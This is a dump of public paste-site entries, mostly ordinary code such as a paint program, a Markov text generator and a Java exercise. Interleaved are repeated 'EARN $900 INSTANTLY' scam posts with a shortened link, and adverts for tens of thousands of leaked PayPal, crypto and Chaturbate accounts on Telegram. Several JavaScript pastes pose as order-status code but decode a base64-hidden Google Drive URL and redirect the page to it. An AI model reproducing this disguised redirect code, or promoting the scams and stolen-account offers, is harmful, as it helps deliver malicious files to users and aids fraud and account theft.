id,title,username,language,date,content
aQNvSqy9,EARN $900 INSTANTLY 2025 M6,XoRoGeL,JavaScript,Friday 25th of April 2025 07:04:20 AM CDT," 
Pdf https://tinyurl.com/privguidee

hBz3xT93Z3
"
B6iMaZA0,Products.js,Xp_Isolation,JavaScript,Friday 25th of April 2025 07:02:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47594/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
B7Zcaf0H,Make $1000 15-MINUTES (BEGINNER) 96,XoRoGeL,JavaScript,Friday 25th of April 2025 06:55:05 AM CDT," 
Pdf https://tinyurl.com/privguidee

AGB2jTX1hp
"
XuPeND2N,Order.js,Xp_Isolation,JavaScript,Friday 25th of April 2025 06:47:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17849/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
etdM9bgL,EARN $900 INSTANTLY 2025⭐ NU,XoRoGeL,JavaScript,Friday 25th of April 2025 06:45:48 AM CDT," 
Pdf https://tinyurl.com/privguidee

7xXlVuIuoU
"
2t4GcWbM,Make $1000 15-MINUTES  (BEGINNER) ME,XoRoGeL,JavaScript,Friday 25th of April 2025 06:36:31 AM CDT," 
Pdf https://tinyurl.com/privguidee

tfZGVja4Hg
"
nWSXVtf5,EARN $900 INSTANTLY 2025 M6,XoRoGeL,JavaScript,Friday 25th of April 2025 06:27:16 AM CDT," 
Pdf https://tinyurl.com/privguidee

EcHu4hs8oT
"
xcLuXUE3,Make $1000 15-MINUTES (BEGINNER) 96,XoRoGeL,JavaScript,Friday 25th of April 2025 06:18:01 AM CDT," 
Pdf https://tinyurl.com/privguidee

GkdYDmxqsm
"
rLWmQmCP,EARN $900 INSTANTLY 2025⭐ NU,XoRoGeL,JavaScript,Friday 25th of April 2025 06:08:46 AM CDT," 
Pdf https://tinyurl.com/privguidee

bN1CS4WPjD
"
xg8FDSQ1,Crypto Accounts,dentira,JavaScript,Friday 25th of April 2025 06:05:38 AM CDT,47207 Accounts Posted On https://t.me/leakedbyeminem
dRLYnvKM,dataNone,TestGuy1,JSON,Friday 25th of April 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '67c07570768ba2c96548c49565398a362d7414f00da80e109d64c2e918336e80a8147a0a85a1ed215e28a0b4919b1029048eddca8dfe4221433fd5fea91555ee3866cb32f7f5e06696b72984d921bf37988a0ea280f3bde7926403037f249f5aa0a09fcae935f1918190a455f5135b5f87be86acce148503cb82e96db5653616',
  otherdata: [
    '7adaf759f4d163c17c6665106dd9d5ba',
    'b5663233793d92cda74bddf8c6bc3b2b',
    '8f667f6f6df66050d37394a25038e512',
    '6444d7186a741f4b716aef6ff880b46f',
    '271fa3d52b85ac94ec67b62819adef80',
    '8c10836d09d835143682443b3d386216',
    '693da198a213b065eb94706e6daa0fc8',
    'ef61dd413a27dcd97d54d8104f0846a9'
  ]
}"
7puQLGqT,Untitled,dllbridge,C,Friday 25th of April 2025 05:51:32 AM CDT,"#include <stdint.h>

// Аналог Z80_OUT через ассемблерную вставку
#define PORT_OUT 0x01  // Произвольный порт для вывода

void delay(uint16_t ms) {
    for (uint16_t i = 0; i < ms; i++) {
        for (uint16_t j = 0; j < 100; j++) {
            __asm__(""nop"");  // Задержка с помощью NOP
        }
    }
}

void main() {
    while (1) {
        // Вывод 0x55 в порт PORT_OUT
        __asm
            ld a, #0x55
            out (PORT_OUT), a
        __endasm;
        
        delay(1000);
        
        // Вывод 0xAA в порт PORT_OUT
        __asm
            ld a, #0xAA
            out (PORT_OUT), a
        __endasm;
        
        delay(1000);
    }
}"
7UUJBnGH,PayPal with Balance,dentira,JavaScript,Friday 25th of April 2025 05:50:15 AM CDT,57438 Accounts Posted On https://t.me/leakedbyeminem
WhE7MsPH,Key login,jcel024,Lua,Friday 25th of April 2025 05:42:04 AM CDT,"【Email】juavan【Email】
【pass】juavan【pass】"
6MRH7Tyx,Leaked Accounts - Fresh Hits,dentira,JavaScript,Friday 25th of April 2025 05:34:45 AM CDT,12881 Accounts Posted On https://t.me/leakedbyeminem
0Kg6j3Jb,Simple GDI Paint v1,Kitomas,C++,Friday 25th of April 2025 05:34:18 AM CDT,"#include <public_stuff.hpp>

#include <algorithm>

#define gray(_v) MIN((_v)<<4, 255)



#define color_fg color_history[0]
Color8 color_bg = 0b00000000;
Color8 color_history[17];

Color8 color_hover = 0;

RECT _frame, frame = {CANVAS_W, CANVAS_H, CANVAS_W, CANVAS_H};

Fpoint2d mpos = {CANVAS_W/2, CANVAS_H/2};

Color8 pixdata[CANVAS_W*CANVAS_H];

u32 clear_presses = 0;





/******************************************************************************/

u8 text_hex[16*3] = {
  //0
  0b11111,
  0b10001,
  0b11111,
  //1
  0b00001,
  0b11111,
  0b10001,
  //2
  0b11101,
  0b10101,
  0b10111,
  //3
  0b11111,
  0b10101,
  0b10001,
  //4
  0b11111,
  0b00100,
  0b11100,
  //5
  0b10111,
  0b10101,
  0b11101,
  //6
  0b00111,
  0b00101,
  0b11111,
  //7
  0b11111,
  0b10000,
  0b10000,
  //8
  0b11111,
  0b10101,
  0b11111,
  //9
  0b11111,
  0b10100,
  0b11100,
  //A
  0b11111,
  0b10100,
  0b11111,
  //B
  0b11011,
  0b10101,
  0b11111,
  //C
  0b10001,
  0b10001,
  0b01110,
  //D
  0b01111,
  0b10001,
  0b11111,
  //E
  0b10001,
  0b10101,
  0b11111,
  //F
  0b10000,
  0b10100,
  0b11111,

};





/******************************************************************************/

void draw_hex4(s32 x, s32 y, u8 nybble,
               Color8 color)
{
  nybble &= 15; // Must actually be a nybble
  nybble *= 3;  // Each char is 3 bytes
  nybble += 2;  // The first pixel column is the char's 3rd byte

  const s32 y_start = y;

  for(int _x=0; _x<3; ++_x){
    if(x < 0){  ++x;  continue;  }
    else if(x >= CANVAS_W) break;

    u8 column = text_hex[nybble--];
    y = y_start;

    for(int _y=0; _y<5; ++_y){
      if(y <= -5){  column >>= 1;  ++y;  continue;  }
      else if(y >= CANVAS_H) break;

      if(column&1)
        pixels[PixelCoords(x,y).v] = color;

      column >>= 1;
      ++y;

    }

    ++x;

  }

}



void draw_hex8(s32 x, s32 y, u8 value,
               Color8 color)
{
  draw_hex4(x  , y, value>>4, color);
  draw_hex4(x+4, y, value&15, color);
}



void push_color(Color8 new_color){
  if(color_history[0].v == new_color.v) return;

  for(int i=sizeof(color_history)-1; i>0; --i)
    color_history[i] = color_history[i-1];

  color_history[0] = new_color;

}



void clear_pixdata(){
  memset(&pixdata->v, color_bg.v, CANVAS_W*CANVAS_H);

}


void draw_line_pixdata(s32 x_0, s32 y_0,
                       s32 x_1, s32 y_1,
                       Color8 color)
{
  const s32 d_x =  abs(x_1 - x_0);
  const s32 d_y = -abs(y_1 - y_0);
  const s32 s_x = (x_0<x_1) ? 1 : -1;
  const s32 s_y = (y_0<y_1) ? 1 : -1;
  const s32 s_y_row = s_y * CANVAS_W;

  s32 err = d_x + d_y;

  Color8* dst = &pixdata[x_0 + y_0*CANVAS_W];



  while(true){
    if(  (x_0 >= 0)  &&  (x_0 < CANVAS_W)  &&
         (y_0 >= 0)  &&  (y_0 < CANVAS_H)  )
    {
      dst->v = color.v;
    }

    if(x_0 == x_1  &&  y_0 == y_1) break;
    const s32 err2 = err<<1;

    if(err2 >= d_y){
      err += d_y;
      x_0 += s_x;
      dst += s_x;
    }

    if(err2 <= d_x){
      err += d_x;
      y_0 += s_y;
      dst += s_y_row;
    }

  }

}



void set_color_hover(PixelCoords mpos_addr){
  if(!(mpos.x <  16.0f  &&
       mpos.y >= 64.0f  &&
       mpos.y < (64.0f+8.0f)))
  {
    color_hover = pixels[mpos_addr.v];
  }

}



void set_frame(){
  _frame = frame;

  if(_frame.left   >= _frame.right){ std::swap(_frame.left  , _frame.right); }
  if(_frame.bottom >= _frame.top  ){ std::swap(_frame.bottom, _frame.top  ); }

  _printf(""FRAME {WIDTH, HEIGHT} = {%i, %i}\n"",
          (s32)(_frame.right - _frame.left   + 1),
          (s32)(_frame.top   - _frame.bottom + 1));

}



void draw_rect_colorinc(s32 x, s32 y,
                        s32 w, s32 h)
{
  if(!w || !h) return;

  if(x >= CANVAS_W) return;
  if(y >= CANVAS_H) return;

  if(x <= -w) return;
  if(y <= -h) return;



  const s32 x_start  =  MAX(x, 0);
  const s32 y_start  =  MAX(y, 0);

  const s32 x_upper  =  x + w; // Upper boundary
  const s32 y_upper  =  y + h;

  const s32 x_end  =  MIN(x_upper, CANVAS_W);
  const s32 y_end  =  MIN(y_upper, CANVAS_H);


  #define color (color_inc += 7) //gray( 1+8+((color_inc++)&7) )
  s32 color_inc = 0;

  Color8* n_w  =  pixels;
  n_w  +=  MIN(x_start, CANVAS_W-1);
  n_w  +=  MIN(y_start, CANVAS_H-1) * CANVAS_W;

  Color8* n_e  =  n_w + ((x_end-x_start)-1);
  Color8* s_w  =  n_w + ((y_end-y_start)-1)*CANVAS_W;



  // From north-west, going down
  if(x >= 0){
    Color8* _n_w  =  n_w;
    for(s32 _y=y_start; _y<y_end; ++_y){
      _n_w->v = color;
      _n_w += CANVAS_W;
    }

  }

  // From north-west, going right
  if(y >= 0){
    for(x=x_start; x<x_end; ++x)
      (n_w++)->v = color;

  }

  // From north-east, going down
  if(x_upper < (CANVAS_W+1)){
    for(y=y_start; y<y_end; ++y){
      n_e->v = color;
      n_e += CANVAS_W;
    }

  }

  // From south-west, going right
  if(y_upper < (CANVAS_H+1)){
    for(x=x_start; x<x_end; ++x)
      (s_w++)->v = color;

  }

  #undef color

}





int user_main(int argc, char** argv){
  PixelCoords mpos_addr     = 0;
  PixelCoords mpos_addr_old = 0;
  bool fg_cursor = true;
  bool first_frame_set = true;



  while(!win_closed){
    //Handle events

    Event evt;

    while(pollEvent(&evt))
    switch(evt.type){
      case EVENT_QUIT: return 0; // No break needed



      case EVENT_KEY_DOWN: if(!evt.key.repeat){
        switch(evt.key.vkey){
          case VKEY_1: {
            _select_fg_color:
            if(mpos.x <= 16.0f  &&  mpos.y <= 64.0f)
              push_color(color_hover);
            else if(mpos.x >= 16.0f || mpos.y >= (64.0f+8.0f))
              color_fg = color_hover;
          } break;

          case VKEY_2: {
            _select_bg_color:
            color_bg = color_hover;
          } break;

          case VKEY_0:
          case VKEY_SPACE:
          {
            if((clear_presses++)&1) clear_pixdata();
          } break;

          case VKEY_LBRACKET: {
            if(mpos.x > 16.0f){
              frame.left = (s32)mpos.x;
              frame.top  = (s32)mpos.y;
              if(first_frame_set){
                frame.right  = frame.left;
                frame.bottom = frame.top;
                first_frame_set = false;
              }
              set_frame();
            }
          } break;
          case VKEY_RBRACKET: {
            if(mpos.x > 16.0f){
              frame.right  = (s32)mpos.x;
              frame.bottom = (s32)mpos.y;
              if(first_frame_set){
                frame.left = frame.right;
                frame.top  = frame.bottom;
                first_frame_set = false;
              }
              set_frame();
            }
          } break;

          case VKEY_BSLASH: {
          #ifdef _DEBUG
            Point2d dims = {_frame.right - _frame.left   + 1,
                            _frame.top   - _frame.bottom + 1};

            printf(""// First line is: \""w, h, transparency, 0,0,0,0,0\""\n"");
            printf(""const unsigned char exported_image[] = { "");
            //printf(""const Color8 exported_image[] = { "");

            printf(""%i, %i, 0x%02X, 0,0,0,0,0, // %i Bytes"",
                   dims.x,dims.y, color_bg.v, 8+dims.x*dims.y);

            for(s32 y=_frame.bottom; y<=_frame.top; ++y){
              printf(""\n  "");
              for(s32 x=_frame.left; x<=_frame.right; ++x)
                printf(""0x%02X, "", pixdata[x + y*CANVAS_W].v);
            }

            printf(""\n};\n"");
          #endif
          } break;

          case VKEY_F1:
          case VKEY_BACKSPACE:
          {
            showMessageBox(
              ""Controls:\n""
              ""Middle click to trap cursor, \""esc\"" to release\n""
              ""\n""
              ""Left click to draw with the current foreground color\n""
              ""Right click to draw with the current background color\n""
              ""\n""
              ""Scroll wheel to increment foreground color\n""
              ""\n""
              ""One Key (1) OR X2 mouse click: pick foreground color\n""
              ""Two Key (2) OR X1 mouse click: pick background color\n""
              ""Zero Key (0) OR Space ( ): clear canvas with background color\n""
              ""\n""
              ""Left Square Bracket  ([): set point A of export frame\n""
              ""Right Square Bracket (]): set point B of export frame\n""
              ""Backslash (\\): export contents of frame to stdout""
              , ""Simple GDI Paint  -  Build time:  "" __TIMESTAMP__);
          } break;

          default:;

        }
      } break;



      case EVENT_MOUSE_DOWN:
        clear_presses = 0;
      case EVENT_MOUSE_MOVED:
      {
        bool mdown = evt.type==EVENT_MOUSE_DOWN;
        mpos_addr_old = mpos_addr;
        mpos.x = evt.mouse.x;
        mpos.y = evt.mouse.y;
        mpos_addr = {(u8)mpos.x, (u8)mpos.y};

        u8 button = evt.mouse.button;
        if(button){
          Color8 selected;
          bool draw = true;
          if(     button&MBUTTON_X2 && mdown) goto _select_fg_color;
          else if(button&MBUTTON_X1 && mdown) goto _select_bg_color;
          else if(button&MBUTTON_LEFT){
            if(mpos.x >= 16.0f){ selected = color_fg; fg_cursor= true; }
            else if(mdown){ goto _select_fg_color; }
          } else if(button&MBUTTON_RIGHT){
            if(mpos.x >= 16.0f){ selected = color_bg; fg_cursor=false; }
            else if(mdown){ goto _select_bg_color; }
          }
          else draw = false;

          if(draw){
            draw_line_pixdata(mpos_addr_old.x, mpos_addr_old.y,
                              mpos_addr.x, mpos_addr.y, selected);
          }
        }
      } break;



      case EVENT_MOUSE_VWHEEL: {
        color_fg.v += (s32)evt.mouse.dy;
      } break;



      default:;

    }





    /* - DRAW STUFF - */

    // Copy pixel data
    memcpy(&pixels->v, &pixdata->v, sizeof(pixdata));

    fill_rect(0, 64+8, 8,4, 0b11000111);

    // Color history view (including foreground color)
    for(s32 i=0; i<(s32)sizeof(color_history); ++i)
      fill_rect(0, CANVAS_H-4*(i+1), 8, 4, color_history[i]);

    // Background color view
    fill_rect(8, CANVAS_H-4, 8, 4, color_bg);

    // Grayscale palette view
    for(int y=0; y<=16; ++y)
      fill_rect(8, CANVAS_H-4*(18-y), 8, 4, gray(y));

    // Full palette view
    Color8 c = 0;
    for(int y=0; y<64; y+=2)
    for(int x=0; x<16; x+=2)
    {
      int addr = x + y*CANVAS_W;
      pixels[  addr          ] = c.v; // Bottom-left
      pixels[++addr          ] = c.v; // Bottom-right
      pixels[  addr+=CANVAS_W] = c.v; // Top-right
      pixels[--addr          ] = c.v; // Top-left
      ++c.v;
    }

    // Frame view
    if(!first_frame_set){
      draw_rect_colorinc(_frame.left-1, _frame.bottom-1,
                         _frame.right - _frame.left   + 3,
                         _frame.top   - _frame.bottom + 3);
    }

    // UI border vertical line
    draw_line(16, 0, 16, CANVAS_H, 0b11111111);

    // Whatever color the mouse is currently hovered over
    set_color_hover(mpos_addr);
    fill_rect(0, 64, 16, 8, color_hover);
    draw_hex8(1, 64+1, color_hover.v, gray(17-(color_hover.v>>4)));

    // Cursor
    pixels[mpos_addr.v] = (fg_cursor) ? color_fg : color_bg;



    // Draws the canvas to the window
    canvas_present(true);



    // Waits for about 16ms to approximate 60fps
    timeSleep(16);

  }



  return 0;

}
"
ALj3Mt4g,Market.js,Xp_Isolation,JavaScript,Friday 25th of April 2025 05:31:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72979/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uf5XeHqy,Chaturbate with Tokens,dentira,JavaScript,Friday 25th of April 2025 05:19:22 AM CDT,78276 Accounts Posted On https://t.me/leakedbyeminem
hh7zrJTN,CrapGPT v1,Kitomas,Python,Friday 25th of April 2025 05:19:08 AM CDT,"#!/usr/bin/env python3

from sys import argv, stderr
from os import system as cmd
from math import floor
from os.path import exists
from pprint import pprint
from random import choices, randint



def errFatal(errorString, returnCode = -1):
    print('ERROR: '+errorString, file=stderr)
    exit(returnCode)
    
def rnd(x): return floor(x+0.5) # Python's built-in rounding is stupid

def toInt(x):
    try:              return rnd(eval(x))
    except Exception: return None



wordCount   = toInt(argv[1])  if len(argv) > 1 else 50
fileIn_name = argv[2]         if len(argv) > 2 else 'input.txt'
word        = argv[3].lower() if len(argv) > 3 else None

if wordCount is None:
    errFatal('Word count provided is not an integer value')

if not exists(fileIn_name):
    errFatal(f'File ""{fileIn_name}"" doesn\'t exist!')





def strip_all(s):
    return s.strip("" \""'!?.,;:"").lower()

def split_all(s):
    # Split by line breaks and spaces
    l_0 = ( (' ').join(s.splitlines()) ).split(' ')
    # Split by dashes
    l_1 = ( ('-').join(l_0) ).split('-')
    # Strip each string in list, while culling empty strings
    return [strip_all(_s) for _s in l_1 if _s != '']





def convert_word_dict(d):
    next_words = []
    weights    = []
    
    for k in d:
        next_words.append(k)
        weights.append(d[k])
        
    return [next_words, weights]



def build_dictionary(l):
    if len(l) <= 1: return None

    dict_a = {}

    for i in range(len(l)-1):
        current = l[i  ]
        next    = l[i+1]
        
        if not current in dict_a:
            dict_a[current] = {}
            
        if not next in dict_a[current]:
            dict_a[current][next] = 0
            
        dict_a[current][next] += 1

    dict_b = {}
    
    for word in dict_a:
        dict_b[word] = convert_word_dict(dict_a[word])

    return dict_b



def get_next_word(word, dictionary):
    if not word in dictionary: return None
    words_and_weights = dictionary[word]
    return choices(words_and_weights[0],
                   words_and_weights[1], k=1)[0]





if __name__ == '__main__':
    file = open(fileIn_name, 'r')
    data = split_all(file.read())
    file.close()
    
    dict = build_dictionary(data)
    
    if word is None:
        word = data[ randint(0,len(data)-1) ]
        
    if get_next_word(word, dict) is None:
        errFatal(f'""{word}"" does not have an entry in the word dictionary!')
    
    for i in range(wordCount):
        print(word, end=' ')
        word = get_next_word(word, dict)
        if word is None: word = data[ randint(0,len(data)-1) ]



'''
'youth': {'and': 1,
          'heroes': 1,
          'inclined': 1,
          'into': 1,
          'of': 1,
          'was': 2,
          'who': 1,
          'with': 1},
'''"
3VPKQbJm,[NP] Mister Farenheit,dzocesrce,Java,Friday 25th of April 2025 05:19:00 AM CDT,"/**
 * I partial exam 2016
 */
 import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;
import java.util.Arrays;
import java.util.Comparator;
import java.util.DoubleSummaryStatistics;
import java.util.List;
import java.util.stream.Collectors;


class Temperature implements Comparable<Temperature>{
    int day;
    List<Double> measurements;
    char degrie;

    public Temperature(int day, List<Double> measurements,char degrie) {
        this.day = day;
        this.measurements = measurements;
        this.degrie= degrie;
    }

    public void convertToCelsius(){
        if(degrie=='C')
            return ;
        measurements= measurements.stream().map(i->(((i-32)*5)/9)).collect(Collectors.toList());
        degrie='C';
    }

    public void convertToFarenheit(){
        if(degrie=='F')
            return ;
        measurements= measurements.stream().map(i->(((i*9)/5)+32)).collect(Collectors.toList());
        degrie='F';
    }

    public char getDegrie() {
        return degrie;
    }

    public static Temperature create(String line){
        String[] parts= line.split(""\\s+"");
        int day = Integer.parseInt(parts[0]);
        char degrie = parts[1].charAt(parts[1].length()-1);
        List<Double> measurements= Arrays.stream(parts).skip(1).map(i->Double.parseDouble(i.substring(0,i.length()-1))).collect(Collectors.toList());

        return new Temperature(day,measurements,degrie);
    }
    @Override
    public String toString() {
        DoubleSummaryStatistics doubleSummaryStatistics= measurements.stream().mapToDouble(i->i).summaryStatistics();
        return String.format(""%3d: Count: %3d Min: %6.2f%c Max: %6.2f%c Avg: %6.2f%c"",day,
                doubleSummaryStatistics.getCount(),
                doubleSummaryStatistics.getMin(),
                getDegrie(),
                doubleSummaryStatistics.getMax(),
                getDegrie(),
                doubleSummaryStatistics.getAverage(),
                getDegrie());
    }

    public int getDay() {
        return day;
    }

    @Override
    public int compareTo(Temperature o) {
        return Comparator.comparing(Temperature::getDay).compare(this,o);
    }
}

class DailyTemperatures {
    List<Temperature> temperatureList;

    public DailyTemperatures() {
        temperatureList= new ArrayList<>();
    }

    public void readTemperatures(InputStream in) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        temperatureList= bufferedReader.lines().map(Temperature::create).collect(Collectors.toList());
    }

    public void writeDailyStats(PrintStream out, char c) {
        PrintWriter printWriter= new PrintWriter(out);
        if(c=='C')
            temperatureList.stream().forEach(Temperature::convertToCelsius);
        else{
            temperatureList.stream().forEach(Temperature::convertToFarenheit);
        }
        temperatureList.stream().sorted().forEach(i-> printWriter.println(i));
        printWriter.flush();
    }
}
public class DailyTemperatureTest {
    public static void main(String[] args) {
        DailyTemperatures dailyTemperatures = new DailyTemperatures();
        dailyTemperatures.readTemperatures(System.in);
        System.out.println(""=== Daily temperatures in Celsius (C) ==="");
        dailyTemperatures.writeDailyStats(System.out, 'C');
        System.out.println(""=== Daily temperatures in Fahrenheit (F) ==="");
        dailyTemperatures.writeDailyStats(System.out, 'F');
    }
}

// Vashiot kod ovde"
cBvaH7f7,Untitled,Xp_Isolation,JavaScript,Friday 25th of April 2025 05:06:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/22483/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PF6zbtEL,Crypto Accounts,dentira,JavaScript,Friday 25th of April 2025 05:04:01 AM CDT,17627 Accounts Posted On https://t.me/leakedbyeminem
aS8xMua8,work for 2025-04-25 (5/5),Kitomas,C++,Friday 25th of April 2025 05:02:37 AM CDT,"/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\include\sound_stuff.hpp"":
// This file should not be included on its own,
// but rather as part of ""public_stuff.hpp""!
//
// (Most of this is lifted straight from kit_sdl2, so if some
//  things here are inconsisent with the rest, that's why!)
//
// ALSO, DO NOT USE THIS AS REFERENCE IN A FUTURE PROJECT,
// BECAUSE IT'S A HACKY MESS!
#ifndef _SOUND_STUFF_HPP
#define _SOUND_STUFF_HPP

#ifdef SOUND_STUFF_USED

#include <windows.h>





//#define AUDIODATA_FILELOAD_USED
#define AUDIODATA_SAVEAUDIO_USED
#define AUDIODATA_CONVERTFORMAT_USED





#define GET_AUDIO_BITSIZE(x)     (x & (0xFF ))
#define GET_AUDIO_ISFLOAT(x)     (x & (1<< 8))
#define GET_AUDIO_ISBIGENDIAN(x) (x & (1<<12))
#define GET_AUDIO_ISSIGNED(x)    (x & (1<<15))

#define GET_AUDIO_BYTESIZE(x)    (GET_AUDIO_BITSIZE(x)/8)



enum AudioSampleFormatEnum {
  SMPFMT_U8     = 0x0008,  //unsigned  8-bit samples
  SMPFMT_S8     = 0x8008,  //  signed  8-bit samples
  SMPFMT_U16LSB = 0x0010,  //unsigned 16-bit samples
  SMPFMT_S16LSB = 0x8010,  //  signed 16-bit samples
  SMPFMT_S32LSB = 0x8020,  //  signed 32-bit samples
  SMPFMT_F32LSB = 0x8120,  //32-bit floating point samples

  SMPFMT_U16MSB = 0x1010,  //same as LSB, except with big-endian byte order
  SMPFMT_S16MSB = 0x9010,  //same as LSB, except with big-endian byte order
  SMPFMT_S32MSB = 0x9020,  //same as LSB, except with big-endian byte order
  SMPFMT_F32MSB = 0x9120,  //same as LSB, except with big-endian byte order

  SMPFMT_S24LSB = 0x8018,  //  signed 24-bit samples
  SMPFMT_F64LSB = 0x8140,  //64-bit floating point samples

  SMPFMT_S24MSB = 0x9018,  //same as LSB, except with big-endian byte order
  SMPFMT_F64MSB = 0x9140,  //same as LSB, except with big-endian byte order

  //aliases
  SMPFMT_U16    = SMPFMT_U16LSB,
  SMPFMT_S16    = SMPFMT_S16LSB,
  SMPFMT_S24    = SMPFMT_S24LSB,
  SMPFMT_S32    = SMPFMT_S32LSB,
  SMPFMT_F32    = SMPFMT_F32LSB,
  SMPFMT_F64    = SMPFMT_F64LSB,

  //may also be used as a wildcard
   //(as in this may be associated with a value != 0xFFFF)
  SMPFMT_UKNOWN = 0xFFFF,

};





/******************************************************************************/





struct AudioDataHeader;

// The pointer this returns MUST have been allocated with mem_alloc()
// Also, ->samples must not be a separate allocation! samples must be contiguous
// and on the same memory block as the header itself!
//
// (Basically, header_ptr->samples = (u8*)header_ptr+header_ptr->headerSize)
typedef AudioDataHeader* (*AudioDataLoaderCallback)(const char* filePath);

typedef bool (*AudioDataSaverCallback)(const char* filePath,
                                       AudioDataHeader& header_in);





// File signature = ""kPxM"" (no null terminator)
#define KPM_FILE_SIG (0x4D78506B)

// This struct is identical to a "".kpm"" file as it contains the same header data
struct AudioDataHeader { //72B (0x48B)
  u32        magic; // (0x00) = KPM_FILE_SIG = 0x4D78506B = ""kPxM""
  u16       format; // (0x04) = one of AudioSampleFormatEnum if fmt_version == 1
  u16   headerSize; // (0x06) = must be >=sizeof(AudioDataHeader)
  u64     dataSize; // (0x08) = size of audio data, in bytes

  u64    loopStart; // (0x10) = which sample to loop back to
  u64      loopEnd; // (0x18) = which sample to jump back to loopStart on

  u64   numSamples; // (0x20) = # of sample frames in audio data
  u32   sampleRate; // (0x28) = the audio data's sample rate, in Hz
  u32      bitRate; // (0x2C) = the audio's bit rate (per second)

  u16    loopCount; // (0x30) = # of times to loop audio (0 = no loop, 0xFFFF = inf loop)
  u16     channels; // (0x32) = # of interlaced channels in the audio data
  u8     _reserved; // (0x34)
  u8   fmt_version; // (0x35) = 0=kit_w32, 1=kit_sdl2
  u8          mode; // (0x36) = 0 for normal PCM or float data types
  u8 metadata_type; // (0x37) = 0 for no metadata

  void*    samples; // (0x38) = the audio's sample data (appears as nullptr in file)
  void*   userdata; // (0x40) = user-defined (also appears nullptr in file)
                    // (0x48) = (start of sample data, assuming a .kpm file)

  // Only useful #ifdef _DEBUG
  void printHeader(const char* name = nullptr);

};





class AudioData {
  bool _allocate_hdr(u16 headerSize, u64 dataSize);

public:
  AudioDataHeader* hdr = nullptr;

  StereoF32 volume = {1.0f, 1.0f};



  // Create with everything zeroed out, except headerSize, dataSize, and samples
  AudioData(u16 headerSize, u64 dataSize){ _allocate_hdr(headerSize,dataSize); }

  // Create with zeroed out sample data
  AudioData(AudioSampleFormatEnum format,
